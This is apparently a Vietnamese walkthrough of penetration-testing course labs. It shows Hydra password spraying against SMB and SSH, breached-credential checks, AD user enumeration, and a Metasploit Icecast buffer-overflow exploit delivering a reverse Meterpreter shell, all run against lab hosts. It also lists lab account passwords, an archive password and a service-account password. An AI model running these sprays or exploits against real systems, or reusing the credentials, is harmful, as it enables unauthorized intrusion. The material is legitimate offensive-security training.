![alt text](IMG/LAB2/LAB2.1/image.png)

```txt
Password Unrar: 4yRu#c@7#zk9*F


SEC560 Slingshot Linux (I01): sec560/sec560
SEC560 Windows 10 (I01): sec560/Sec@560/1234@abcd
PC02: Draco Malfoy/<guessing my password>
<!-- SVC_SQLService2 / ^Cakemaker -->
ParrotSec6.0: root/toor
```

![alt text](IMG/LAB2/LAB2.1/image-3.png)

# Lab 2.1: Password Guessing

## Mục tiêu

- Sử dụng Hydra để thực hiện tấn công đoán mật khẩu nhắm vào SMB trên mục tiêu Windows.

- Sử dụng Hydra để thực hiện tấn công dò mật khẩu nhắm vào hệ thống SMB trên máy chủ Windows.

- Sử dụng Hydra để thực hiện tấn công đoán mật khẩu nhằm vào một dịch vụ SSH.

## Thiết lập phòng thí nghiệm.

Máy ảo được sử dụng:

- Slingshot Linux.

Bạn có thể ping địa chỉ 10.130.10.10 từ máy ảo Slingshot Linux:

Yêu cầu

```bash
ping -c 4 10.130.10.10
```

Kết quả dự kiến

![alt text](IMG/LAB2/LAB2.1/image-1.png)

## Hướng dẫn thực hành từng bước

Bây giờ chúng ta sẽ tiến hành bài thực hành đoán mật khẩu trên hai máy mục tiêu:

- `10.130.10.10`: Một máy chủ web Linux.

- `10.130.10.4`: Bộ điều khiển miền Windows.

Giả sử chúng ta được thông báo rằng tổ chức mục tiêu có chính sách mật khẩu yêu cầu tất cả mật khẩu phải có độ dài từ tám ký tự trở lên và đáp ứng 3 trong 4 tiêu chí sau:

- Con số.

- Chữ hoa.

- chữ thường.

- Ký tự đặc biệt.

Đây là một chính sách rất tiêu chuẩn.

Đó là kịch bản của chúng ta. Hãy cùng nhau tấn công nó.

### 1. Password Spray

Chúng ta hãy thử phương pháp "thử mật khẩu ngẫu nhiên", bằng cách chọn một mật khẩu và nhiều tên người dùng khác nhau. Đây là một kỹ thuật tốt khi bạn có một danh sách lớn các tài khoản người dùng và cần phải cẩn thận với các chính sách đăng nhập có thể khóa tài khoản sau quá nhiều lần đoán sai mật khẩu.

Ngoài ra, trong quá trình kiểm thử xâm nhập, tên người dùng sẽ không được cung cấp cho bạn một cách dễ dàng.

Giả sử chúng ta đã biết định dạng từ giai đoạn trinh sát, và chúng ta đã xác định định dạng tên người dùng là chữ cái đầu tiên của tên theo sau là họ (chúng ta sẽ gọi đây là "flast"). Vì vậy, Walt Disney sẽ có tài khoản đó `wdisney`. Chúng ta chưa biết bất kỳ tài khoản hợp lệ nào vào thời điểm này. Điều chúng ta cần làm là đoán.

Một cá nhân nào đó đã khéo léo trích xuất danh sách tên từ Facebook và sử dụng danh sách đó để tạo ra một danh sách tên ở định dạng "flast".

Chúng tôi đã cung cấp 100 tên người dùng hàng đầu từ danh sách đó `/opt/passwords/facebook-f.last-100.txt` (Danh sách đầy đủ có thể được tìm thấy trên skullsecurity.org ). Hãy cùng xem 20 tên người dùng đầu tiên trong danh sách.

Yêu cầu:

```bash
head -n 20 /opt/passwords/facebook-f.last-100.txt
```

Kết quả dự kiến:

![alt text](IMG/LAB2/LAB2.1/image-2.png)


Như bạn thấy, Smith là một họ rất phổ biến. Chúng ta sẽ sử dụng danh sách này để thử đoán mật khẩu ban đầu, kết hợp với một số mật khẩu yếu (dễ đoán) phổ biến.

Hãy sử dụng danh sách này với mật khẩu thông dụng, định dạng SeasonYear (Mùa năm). Hãy nhớ rằng, Hiboxy là một công ty Bắc Mỹ, vì vậy hãy sử dụng mùa hiện tại (Xuân, Hè, Thu, Đông) và năm hiện tại. Ví dụ, nếu hiện tại là tháng Hai năm 2022, bạn sẽ sử dụng mật khẩu `Winter2022`. Nếu cách đó không hiệu quả, hãy thử mùa tiếp theo (có thể việc xoay vòng 90 ngày yêu cầu thay đổi) cũng như mùa trước đó (người dùng có thể chưa cần xoay vòng).

Hãy xem chúng ta tìm thấy gì nào!

> Ghi chú
>
> Lưu ý: Mật khẩu ở đây được tạo tự động bằng chương trình, vì vậy mật khẩu thực tế sẽ khác nhau tùy thuộc vào thời điểm bạn tham gia lớp học và thời điểm cơ sở hạ tầng được xây dựng. Chúng tôi sẽ sử dụng ký hiệu giữ chỗ SEASONYEAR thay cho mật khẩu thật.

Hãy sử dụng Hydra cho việc phun mật khẩu này (nhớ thay thế `SEASONYEAR` bằng mùa hiện tại ở bán cầu bắc và năm hiện tại).

Chúng tôi sẽ sử dụng các phương án sau:

- `-L /opt/passwords/facebook-f.last-100.txt` Sử dụng danh sách tên người dùng.
- `-p SEASONYEAR` Hãy sử dụng mật khẩu SeasonYear chính xác hiện tại (ví dụ: "Spring2022")
- `-m workgroup:{hiboxy}` Chúng ta đang kết nối đến bộ điều khiển miền và cần chỉ định miền (lưu ý: bạn cần có {}),
- `10.130.10.4` Địa chỉ IP của bộ điều khiển miền (tìm thấy bằng cách quét)
- `smb2` Giao thức

Vui lòng thay thế `SEASONYEAR` trong lệnh sau bằng mùa và năm hiện tại ở bán cầu bắc, ví dụ như `Spring2024` (do mật khẩu sẽ được setup khi mà người học mua nên cần phải chỉnh thành năm đúng người dùng mua).

```bash
hydra -L /opt/passwords/facebook-f.last-100.txt -p Spring2024 -m workgroup:{hiboxy} 10.130.10.10 smb2
```

Kết quả dự kiến:

![alt text](IMG/LAB2/LAB2.1/image-5.png)

Đã tìm thấy mật khẩu cho `alee`.

Nhân tiện, bạn có thể tìm thấy người dùng này bằng cách xem trang giới thiệu của trang web chính!

Trong thực tế, chúng ta sẽ đợi cho đến khi khoảng thời gian quan sát dài nhất kết thúc trước khi thử đoán mật khẩu khác. Nếu chúng ta làm quá nhanh, chúng ta có nguy cơ khóa tài khoản người dùng và gây ra từ chối dịch vụ! Tuy nhiên, đây là môi trường thử nghiệm, và chúng ta đã tắt cài đặt này để quá trình diễn ra nhanh hơn.

Hãy thử thêm một vài lựa chọn khác nữa:

- Mùa giải tới: 

    ```bash
    hydra -L /opt/passwords/facebook-f.last-100.txt -p Summer2024 -m workgroup:{hiboxy} 10.130.10.10 smb2
    ````

    ![alt text](IMG/LAB2/LAB2.1/image-6.png)

- Mùa giải trước:

    ```bash
    hydra -L /opt/passwords/facebook-f.last-100.txt -p  Winter2023 -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-7.png)

- Mùa này được thêm `!` vào cuối:

    ```bash
    hydra -L /opt/passwords/facebook-f.last-100.txt -p  Spring2024! -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-8.png)

- Mùa tiếp theo với chữ `!` vào cuối:

    ```bash
    hydra -L /opt/passwords/facebook-f.last-100.txt -p  Summer2024! -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-9.png)

- Mùa trước được thêm `!` vào cuối:

    ```bash
    hydra -L /opt/passwords/facebook-f.last-100.txt -p  Winter2023! -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-11.png)

Bạn đáng lẽ phải tìm thấy những người dùng và mật khẩu này.

|Tên người dùng|Định dạng mật khẩu|
|--|--|
|`alee`|`Spring2024`|
|`Janerson`|`Summer2024`|
|`ssmith`|`Summer2024!`|
|`jlopez`|`Winter2023!`|

### 2. The dictionary

Danh sách mật khẩu dùng để đoán sẽ ngắn hơn nhiều so với danh sách mật khẩu dùng để tấn công (chúng ta sẽ thảo luận về tấn công sau trong khóa học này). Việc đoán mật khẩu yêu cầu chúng ta tương tác với một dịch vụ từ xa, điều này sẽ chậm hơn. Ngoài ra, chúng ta không muốn thao tác quá nhanh để tránh gây ra tấn công từ chối dịch vụ. Thêm vào đó, các cuộc tấn công mật khẩu trực tuyến có thể dẫn đến việc bị khóa tài khoản, vì vậy chúng ta cần phải cẩn thận. Chúng tôi đã vô hiệu hóa tính năng khóa tài khoản để bạn (và các sinh viên khác) không gây ra sự cố với phòng thí nghiệm.

Để đơn giản hóa mọi việc, chúng ta sẽ sử dụng một danh sách mật khẩu rất đơn giản bao gồm mùa và năm, cũng như Mật khẩu 1. Hãy cùng xem nội dung của tệp mà chúng ta sẽ sử dụng cho lần đoán ban đầu.

```bash
cat /opt/passwords/simple.txt
```

![alt text](IMG/LAB2/LAB2.1/image-12.png)

Hãy đếm số dòng bằng cách sử dụng `wc -l`.

```bash
wc -l /opt/passwords/simple.txt
```

![alt text](IMG/LAB2/LAB2.1/image-13.png)

Chúng ta đã có sẵn danh sách mật khẩu đơn giản rồi. Bắt đầu đoán thôi!

### 3. Password Guessing (SSH)

Với danh sách mật khẩu tùy chỉnh trong tay, giờ đây chúng ta có thể cấu hình Hydra cho cuộc tấn công đoán mật khẩu đầu tiên. Chúng ta biết một trong những tên quản trị viên Linux là Bruce Green, vì vậy chúng ta sẽ sử dụng tên này bgreenđể đoán mật khẩu.

Chạy Hydra với các thiết lập sau:


- Tên người dùng `bgreen`.

- Hãy sử dụng danh sách mật khẩu mà chúng ta vừa tạo.

- Mục tiêu đơn lẻ `10.130.10.10`.

- Giao thức là SSH.

```bash
hydra -l bgreen -P /opt/passwords/simple.txt 10.130.10.10 ssh
```

![alt text](IMG/LAB2/LAB2.1/image-14.png)

Hãy chú ý đến dòng sau trong kết quả đầu ra.

```bash
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
```

Hydra cảnh báo chúng ta rằng SSH có thể giới hạn tốc độ và đề xuất sử dụng 4 luồng thay vì 16 luồng mặc định. Hydra vẫn sử dụng giá trị mặc định để quét.

### 4. Verifying Access

Giờ chúng ta đã có tài khoản này, hãy sử dụng Hydra để xem liệu chúng ta có thể sử dụng thông tin đăng nhập này trên bất kỳ hệ thống Windows nào không.

Trước tiên, hãy lấy danh sách các hệ thống đang lắng nghe trên cổng 445 (SMB). Chúng ta sẽ chạy Nmap chỉ nhắm mục tiêu vào cổng 445 và lưu kết quả vào /tmp.

```bash
nmap -n -Pn -p 445 --open -oA /tmp/smb 10.130.10.0/24
```

- `nmap` : công cụ quét mạng/port.

- `-n` : không DNS resolve (không đổi IP → tên máy). Quét nhanh hơn, ít “ồn” hơn.

- `-Pn` : coi như host luôn online, không ping/không discovery trước → Hữu ích khi ICMP bị chặn. Nhược: sẽ quét cả host "chết" nên có thể chậm hơn.

- `-p 445` : chỉ quét cổng 445 (SMB).

- `--open` : chỉ hiển thị host có port mở (open) thôi.

- `-oA /tmp/smb` : xuất kết quả theo 3 định dạng cùng lúc với prefix /tmp/smb:
    
    `/tmp/smb.nmap` (text dễ đọc).

    `/tmp/smb.gnmap` (grep-able).
    
    `/tmp/smb.xml` (xml cho tool khác).

- `10.130.10.0/24` : dải IP từ 10.130.10.1 đến 10.130.10.254 (thường vậy; .0 là network, .255 là broadcast).

Kết quả:

![alt text](IMG/LAB2/LAB2.1/image-15.png)

Sau đó, chúng ta sẽ sử dụng `grep` và `cut` để lấy danh sách các hệ thống đang lắng nghe trên cổng 445 và lưu nó vào bằng `/tmp/smbservers.txt` cách sử dụng `tee`.

```bash
grep 445/open /tmp/smb.gnmap | cut -d' ' -f 2 | tee /tmp/smbservers.txt
```

![alt text](IMG/LAB2/LAB2.1/image-16.png)

Nếu thực hành online thì kết quả sẽ như sau:

```bash
sec560@slingshot:~$ grep 445/open /tmp/smb.gnmap | cut -d' ' -f 2 | tee /tmp/smbservers.txt
10.130.10.4
10.130.10.5
10.130.10.6
10.130.10.21
10.130.10.25
10.130.10.33
10.130.10.44
10.130.10.45
```

Trong lệnh trên, chúng ta thực sự không cần sử dụng grep 445/open, nhưng điều này được khuyến nghị nếu chúng ta đã quét với nhiều hơn một cổng (như các lần quét trong Bài thực hành 1.4).

Hãy sử dụng Hydra để kiểm tra xem thông tin đăng nhập này có hợp lệ trên hệ thống Windows hay không.

```bash
hydra -m workgroup:{hiboxy} -l bgreen -p Password1 -M /tmp/smbservers.txt smb2
```

![alt text](IMG/LAB2/LAB2.1/image-17.png)

Nếu thực hành online kết quả sẽ như sau:

```bash
sec560@slingshot:~$ hydra -m workgroup:{hiboxy} -l bgreen -p Password1 -M /tmp/smbservers.txt smb2
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-22 22:22:22
[DATA] max 1 task per 8 servers, overall 8 tasks, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking smb2://(8 targets):445/workgroup:{hiboxy}
[445][smb2] host: 10.130.10.25   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.4   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.5   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.6   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.21   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.33   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.44   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.45   login: bgreen   password: Password1
8 of 8 targets successfully completed, 8 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-22 22:22:22
```

Tại sao có vẻ như tài khoản này có quyền truy cập vào tất cả các hệ thống Windows này? Hãy nhớ rằng, tất cả những gì chúng ta đang làm là xác định xem thông tin đăng nhập tài khoản miền có hợp lệ hay không. Việc kiểm tra này KHÔNG kiểm tra xem người dùng có quyền quản trị đối với các máy tính từ xa này hay không. Để thực hiện loại kiểm tra này, chúng ta cần sử dụng một công cụ, chẳng hạn như Find-LocalAdminAccesstừ PowerSploit .

### 5. Breached Credentials (thông tin đăng nhập bị rò rỉ)

Như đã thảo luận trước đó trong khóa học, chúng ta thường tìm kiếm thông tin đăng nhập bị đánh cắp trong giai đoạn trinh sát. Chúng tôi đã cung cấp kết quả từ một cuộc tìm kiếm (mô phỏng) các thông tin đăng nhập đó. Hãy cùng xem danh sách tại địa chỉ này `/opt/passwords/hiboxy-breach.txt`.

```bash
cat /opt/passwords/hiboxy-breach.txt
```

![alt text](IMG/LAB2/LAB2.1/image-18.png)

Tên người dùng và mật khẩu được phân tách bằng dấu hai chấm (:) để chúng ta có thể sử dụng chúng với Hydra. Hãy thử sử dụng các mật khẩu này với Hydra để xem mật khẩu nào hợp lệ.

Sử dụng `-C` tùy chọn này với Hydra để kiểm tra thông tin đăng nhập đã chỉ định. Nó sẽ chỉ thử các tổ hợp đã được chỉ định.

```bash
hydra -C /opt/passwords/hiboxy-breach.txt 10.130.10.10 -m workgroup:{hiboxy} smb2
```

- `hydra`: Công cụ tự động thử đăng nhập nhiều lần với nhiều tài khoản/mật khẩu cho các dịch vụ mạng (SSH, FTP, SMB…).

- `-C /opt/passwords/hiboxy-breach.txt`: Dùng combo list (danh sách username:password) trong file hiboxy-breach.txt. Tức mỗi dòng thường có dạng: user:pass.

- `10.130.10.4`: Máy mục tiêu (IP) để thử đăng nhập.

- `-m workgroup:{hiboxy}`: -m là tham số bổ sung cho module. Với SMB, nó đang đặt workgroup/domain là hiboxy (Hydra sẽ gửi kèm thông tin workgroup khi xác thực SMB).

- `smb2`: Chỉ định dịch vụ/module SMB2 (SMB phiên bản 2), thường chạy trên TCP/445.

Kết quả: 

![alt text](IMG/LAB2/LAB2.1/image-19.png)

Chúng tôi đã phát hiện ra hai trong số các thông tin đăng nhập bị đánh cắp vẫn hoạt động trên tên miền của chúng tôi!

### 6. Password Spraying all domain users

Giờ đây, khi đã có ít nhất một thông tin đăng nhập miền hợp lệ, chúng ta có thể trích xuất danh sách đầy đủ người dùng. Chúng ta sẽ sử dụng `GetADusers.py` từ Impacket. Chúng ta sẽ thảo luận thêm về Impacket trong mục 560.4. Chúng ta cần cung cấp thông tin đăng nhập ở định dạng người dùng:mật khẩu. Chúng ta cũng cần chỉ định địa chỉ IP của bộ điều khiển miền (`-dc-ip`) và yêu cầu công cụ lấy danh sách tất cả người dùng bằng `-all`. Chúng ta sẽ hiển thị kết quả trên màn hình và lưu kết quả bằng tee.

Trước hết cập nhật gói phần mềm:

```bash
python3 -m pip install --upgrade pip
python3 -m pip install charset_normalizer
python3 -m pip install --upgrade "cffi>1.12"
```

```bash
GetADUsers.py hiboxy.com/bgreen:Password1 -dc-ip 10.130.10.10 -all | tee /tmp/adusers.txt
```

![alt text](IMG/LAB2/LAB2.1/image-20.png)

Hãy trích xuất danh sách người dùng. Nhìn vào kết quả ở trên, chúng ta cần bỏ qua 6 dòng đầu tiên rồi lấy mục đầu tiên trên mỗi dòng. Chúng ta sẽ sử dụng `tail -n +6` để bỏ qua 6 dòng đầu tiên, sau đó `cut` để lấy cột đầu tiên.

```bash
tail -n +6 /tmp/adusers.txt | cut -d ' ' -f 1 | tee /tmp/domainusers.txt
```

![alt text](IMG/LAB2/LAB2.1/image-21.png)

Danh sách người dùng:

Giờ chúng ta đã có danh sách người dùng tên miền, hãy thử tấn công bằng phương pháp `spraying password` (phun). Hãy bắt đầu với `Password1`.

```bash
hydra -L /tmp/domainusers.txt -p Password1 -m workgroup:{hiboxy} 10.130.10.10 smb2
```

![alt text](IMG/LAB2/LAB2.1/image-22.png)

Trong thực tế, bạn sẽ đợi cho đến khi cửa sổ quan sát khóa tài khoản hết hạn, rồi thử lại. Vì đây là phòng thí nghiệm đã tắt chức năng khóa tài khoản, hãy thử lại với một vài mật khẩu khác:

- `Password1!:`

    ```bash
    hydra -L /tmp/domainusers.txt -p Password1! -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-23.png)

- `Mùa hiện tại + Năm:`

    ```bash
    hydra -L /tmp/domainusers.txt -p Spring2024 -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-24.png)

- `Mùa tiếp theo + năm:`

    ```bash
    hydra -L /tmp/domainusers.txt -p Summer2024 -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-25.png)

- `Mùa trước + Năm`:

    ```bash
    hydra -L /tmp/domainusers.txt -p Winter2024 -m workgroup:{hiboxy} 10.130.10.10 smb2
    hydra -L /tmp/domainusers.txt -p Winter2023 -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    Không có kết quả.

- `Mùa hiện tại + năm + !:`

    ```bash
    hydra -L /tmp/domainusers.txt -p Spring2024! -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    Không có kết quả.

- `Mùa tiếp theo Năm + !:`

    ```bash
    hydra -L /tmp/domainusers.txt -p Summer2024! -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-26.png)

- `Mùa trước Năm + !:`

    ```bash
    hydra -L /tmp/domainusers.txt -p Winter2023! -m workgroup:{hiboxy} 10.130.10.10 smb2
    ```

    ![alt text](IMG/LAB2/LAB2.1/image-27.png)

Các mật khẩu bạn cần tìm được liệt kê bên dưới. Nhấp vào để mở rộng và xem tất cả các mật khẩu.



```txt
Administrator
Guest
krbtgt
alee:Spring2024
bgreen:Password1
janderson:Summer2024
ssmith:Summer2024!
jlopez: Winter2023!
SVC_SQLService2
jjohnson
mbell
jcooper:Password1
mhernandez:Password1!
antivirus
SVC_SQLService

SVC_SQLService2:^Cakemaker
```

## Phần kết luận

Trong thí nghiệm này, chúng tôi đã thực hiện một cuộc tấn công dò mật khẩu bằng cách sử dụng danh sách người dùng và một mật khẩu duy nhất. Chúng tôi cũng đã thực hiện một cuộc tấn công đoán mật khẩu vào SSH với một danh sách mật khẩu. Cuối cùng, chúng tôi đã kiểm tra các mật khẩu bị đánh cắp đối với tên miền để tìm thêm thông tin đăng nhập hợp lệ.

Khi kết hợp các kỹ thuật này, chúng vô cùng hữu ích đối với một chuyên gia kiểm thử xâm nhập vì chúng có thể cung cấp mật khẩu để truy cập vào môi trường mục tiêu. Quyền truy cập đó có thể là điểm xâm nhập ban đầu vào hệ thống mục tiêu, mà chuyên gia kiểm thử xâm nhập sau đó có thể sử dụng để đánh cắp thông tin và chuyển hướng tấn công.

# Lab 2.2: Metasploit và Meterpreter

## Mục tiêu

Trong bài thực hành này, chúng ta sẽ phân tích Meterpreter, sử dụng Metasploit để triển khai payload linh hoạt này đến một dịch vụ dễ bị tổn thương mà bạn tạm thời cài đặt trên máy tính Windows của mình. Cụ thể, chúng ta sẽ khai thác dịch vụ **Icecast (phiên bản 2.0.0)**, một máy chủ truyền phát đa phương tiện trên internet có lỗ hổng tràn bộ đệm. Payload Metasploit của chúng ta sẽ bao gồm giai đoạn `Meterpreter`, được tải thông qua `stager reverse_tcp`, thiết lập kết nối từ máy bị khai thác trở lại máy tấn công.

## Các bước thực hành trong phòng thí nghiệm

Bạn sẽ thực hiện bài thực hành này hoàn toàn trên hệ thống của riêng mình, với dịch vụ Icecast dễ bị tổn thương trên máy tính Windows của bạn sẽ bị khai thác bởi máy ảo Linux. Trên slide, chúng tôi minh họa các bước từ 1 đến 4 của bài thực hành này. Lưu ý rằng trong suốt toàn bộ bài thực hành, mỗi số bước này vẫn sẽ được áp dụng.

**Bước 1:** Cấu hình Metasploit để khai thác lỗ hổng Icecast.

**Bước 2:** Khai thác dịch vụ mục tiêu, gửi stager reverse_tcp làm payload với stage Meterpreter.

**Bước 3:** Sử dụng Meterpreter chạy bên trong không gian bộ nhớ của Icecast, chuyển hướng kết nối TCP ngược trở lại kẻ tấn công.

**Bước 4:** Tương tác với Meterpreter đang chạy bên trong tiến trình Icecast của máy bị xâm nhập.

![alt text](IMG/LAB2/LAB2.2/image.png)

## Thiết lập phòng thí nghiệm

Các máy ảo được sử dụng:

- Slingshot Linux.

- Windows 10.

Trong bài thực hành này, bạn sẽ tấn công máy tính Windows của mình, khiến nó chạy chương trình Meterpreter. Bạn sẽ vận hành một máy chủ dễ bị tấn công. Đối với bài thực hành này, chúng tôi khuyên bạn nên ngắt kết nối khỏi VPN.

Sau đó, trong Linux, hãy chạy lệnh sau:

```bash
ping IP_address
```

## Hướng dẫn thực hành từng bước

### 1. Metasploit trên Linux

Chúng ta sẽ chuyển sang máy ảo Linux. Bước 1 bao gồm chạy Metasploit và cấu hình nó để khai thác dịch vụ Icecast. Khởi chạy Metasploit bằng lệnh sau:

```bash
msfconsole
```

Lưu ý rằng dấu nhắc lệnh của bạn hiện là dấu nhắc bảng điều khiển Metasploit Framework (`msf6 >`). Tại dấu nhắc msf, hãy nhập các lệnh vào Metasploit một cách tương tác. Yêu cầu nó hiển thị tất cả các mô-đun khai thác mà nó có sẵn.

```bash
show exploits
```

![alt text](IMG/LAB2/LAB2.2/image-1.png)

Bạn có thể thấy có hơn 2.200 lỗ hổng bảo mật trong Metasploit!

Chúng ta sẽ khai thác lỗ hổng Icecast trên Windows. Hãy tìm kiếm lỗ hổng đó.

![alt text](IMG/LAB2/LAB2.2/image-2.png)

Bạn sẽ thấy một lỗ hổng bảo mật dành cho Windows có tên là icecast_header, với xếp hạng "great".

Bây giờ chúng ta sẽ chọn lỗ hổng. Chúng ta sẽ sử dụng lỗ hổng tràn bộ đệm tiêu đề Icecast, lỗ hổng này phù hợp với phiên bản Icecast mà chúng ta đã cài đặt:

```bash
use exploit/windows/http/icecast_header
```

![alt text](IMG/LAB2/LAB2.2/image-3.png)

Lưu ý rằng lời nhắc của chúng ta đã thay đổi và hiện bao gồm tên của lỗ hổng mà chúng ta đã chọn. Ngoài ra, bạn sẽ thấy rằng một payload đã được chọn sẵn cho chúng ta. Hãy sử dụng một payload Meterpreter khác thực hiện kết nối HTTP ngược (thay vì TCP thông thường) trở lại kẻ tấn công sau khi nó đang chạy bên trong tiến trình dễ bị tổn thương.

Đặt target thành `windows/meterpreter/reverse_http`.

```bash
set PAYLOAD windows/meterpreter/reverse_http
```

![alt text](IMG/LAB2/LAB2.2/image-4.png)

Tiếp theo, chúng ta hãy xem xét các tùy chọn liên quan đến lỗ hổng này:

![alt text](IMG/LAB2/LAB2.2/image-5.png)

Tùy chọn đầu tiên chúng ta sẽ thiết lập là RHOSTS. Đây sẽ là địa chỉ IP mà chúng ta muốn Metasploit tấn công. Chúng ta nên nhập địa chỉ IP của máy tính Windows đang chạy dịch vụ Icecast dễ bị tổn thương. Sử dụng `Ethernet0` địa chỉ IP, không phải `tun0` địa chỉ IP. Địa chỉ bạn đang tìm kiếm KHÔNG bắt đầu bằng `10.254.25X.X`.

Hãy đặt `RHOSTS` tùy chọn thành địa chỉ IP của giao diện Ethernet0 trên hệ điều hành Windows của bạn.

```bash
msf6 exploit(windows/http/icecast_header) > back
msf6 > set RHOSTS 10.130.10.25
RHOSTS => 10.130.10.25
```

![alt text](IMG/LAB2/LAB2.2/image-6.png)

Đặt giá trị `LHOST` thành địa chỉ IP của `eth0` giao diện hệ thống Linux của bạn.

```bash
msf6 > set LHOST eth0
```

Metasploit đã được cấu hình xong. Hãy cùng xem lại cấu hình Metasploit của chúng ta bằng lệnh `show options`.

![alt text](IMG/LAB2/LAB2.2/image-7.png)

Chúng tôi gần như đã sẵn sàng cho cuộc tấn công, nhưng trước tiên chúng tôi cần phải hoàn tất một số công việc chuẩn bị.

Bây giờ chúng ta cần khởi động máy chủ Icecast trên máy tính Windows của mình.

Nhấp chuột phải vào biểu tượng Icecast trên màn hình máy tính và chọn "Chạy với quyền quản trị viên" .

![alt text](IMG/LAB2/LAB2.2/image-8.png)

Khi giao diện người dùng (GUI) của Icecast xuất hiện, hãy nhấp vào nút Bắt đầu máy chủ . Trạng thái máy chủ sẽ chuyển sang màu xanh lục và hiển thị "Running".

![alt text](IMG/LAB2/LAB2.2/image-9.png)

![alt text](IMG/LAB2/LAB2.2/image-10.png)

Để đảm bảo Windows có thể kết nối đến máy Linux của chúng ta với shell Meterpreter đảo ngược mà không bị hạn chế, chúng ta cũng cần đảm bảo Windows có thể ping Linux. Trên máy Windows của bạn, tại cmd.exe , hãy chạy lệnh sau:

```bash
ping 10.130.10.128
```

![alt text](IMG/LAB2/LAB2.2/image-11.png)

Nếu lệnh ping thành công, chúng ta có thể tiếp tục. Nếu không, hãy kiểm tra lại cài đặt mạng của bạn.

### 2. Phát động cuộc tấn công

Hãy bắt đầu cuộc tấn công! Trên máy Linux của bạn, tại dấu nhắc msf, gõ `run` và nhấn Enter:

Nếu cuộc tấn công thành công, bạn sẽ thấy một thông báo trên Linux có nội dung "Meterpreter session 1 opened".

![alt text](IMG/LAB2/LAB2.2/image-13.png)

### 3. Sessions

Thông báo nhắc nhở `meterpreter >` cho bạn biết bạn đang ở trong Meterpreter. Nếu bạn muốn thực hiện các thao tác khác trong Metasploit, trước tiên bạn cần đưa phiên làm việc về chế độ nền bằng cách gõ `background` hoặc nhấn phím `CTRL+z`.

Nhập lệnh này `background` để quay lại giao diện điều khiển Metasploit.

```bash
background
# meterpreter > background
# [*] Backgrounding session 1...
# msf6 exploit(windows/http/icecast_header) > 
```

Tại `msf6` dấu nhắc lệnh, chúng ta hiện đang tương tác với Metasploit, chứ không phải với Meterpreter trên máy chủ bị xâm nhập. Hãy cùng xem xét `sessions`...

![alt text](IMG/LAB2/LAB2.2/image-14.png)

Trong trường hợp này, bạn có thể thấy phiên làm việc là `1`. Phiên của bạn có thể khác.

Việc đánh số phiên rất tiện lợi, nhưng chúng ta có thể sẽ có nhiều shell và việc nhớ các số này sẽ khó khăn. Chúng ta có thể đổi tên phiên thành một cái tên dễ nhớ hơn. Để đổi tên phiên, chúng ta cần sử dụng lệnh `use` `-n newname` và số phiên hiện tại `-i ID`.

```bash
sessions -n inecast_win10 -i 1
sessions
```

![alt text](IMG/LAB2/LAB2.2/image-15.png)

Bây giờ chúng ta hãy cùng tương tác trong phiên.


```bash
sessions -i 1
```

### 4. Meterpreter

Khi chuyển sang Bước 4 để tương tác với phiên Meterpreter, hãy cùng xem lại kiến ​​trúc của những gì chúng ta đang quan sát. Bạn đang xem phiên Meterpreter trên máy Linux chạy Metasploit. Phiên đó thực chất đang điều khiển máy Windows của bạn, với Meterpreter chạy bên trong tiến trình Icecast.

Sau khi chạy Meterpreter, chúng ta hãy cùng khám phá hệ thống một chút. Chạy lệnh sau:

```bash
sysinfo
```

![alt text](IMG/LAB2/LAB2.2/image-16.png)

Điều này cho chúng ta biết loại hệ điều hành của máy tính bị xâm nhập.

Bây giờ, hãy xác định tên người dùng của chúng ta trên ô nạn nhân:

```bash
getuid
```

![alt text](IMG/LAB2/LAB2.2/image-17.png)

Chúng ta cần sử dụng cùng tên người dùng mà bạn đã dùng để khởi chạy máy chủ Icecast vì chúng ta đang chạy từ bên trong không gian bộ nhớ của nó.

```bash
ps
```

![alt text](IMG/LAB2/LAB2.2/image-18.png)

![alt text](IMG/LAB2/LAB2.2/image-19.png)

Hãy cùng xem xét các tùy chọn mà chúng ta có với pslệnh này bằng cách xem phần trợ giúp.

```bash
ps -h
```

![alt text](IMG/LAB2/LAB2.2/image-20.png)

Hãy tìm tiến trình Icecast2 của chúng ta bằng cách sử dụng `-S`.

![alt text](IMG/LAB2/LAB2.2/image-21.png)

Hãy tìm kỹ tiến trình có tên [tên tiến trình] `Icecast2.exe`. Ghi lại số ID của tiến trình đó tại đây:

```bash
Process ID for Icecast2.exe : _____________
```

Cuối cùng, hãy cùng xem các lệnh Meterpreter mà chúng ta có sẵn:

```bash
help
```

